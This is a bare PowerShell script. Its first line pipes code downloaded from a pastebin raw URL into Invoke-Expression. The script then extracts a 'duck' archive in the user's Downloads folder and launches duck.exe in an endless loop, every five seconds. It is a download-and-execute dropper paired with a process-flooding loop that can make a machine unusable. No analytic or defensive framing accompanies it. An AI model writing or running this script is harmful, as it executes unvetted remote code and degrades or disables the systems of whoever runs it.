IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/FWWk5dCE') -Force
Expand-Archive -Path "$env:USERPROFILE/Downloads/duck.zip" -DestinationPath "$env:USERPROFILE/Downloads/duck" -Force
Start-Sleep -s 5
$processName = "$env:USERPROFILE\Downloads\duck\duck\duck.exe"
$running = $true

do {
    Start-Process -FilePath $processName
    Start-Sleep -Seconds 5  # Adjust the delay between each process start as needed

    # Check if the loop should continue
    # You can modify the condition based on your requirement
    $running = $true  # Set to $false to stop the loop
} while ($running)
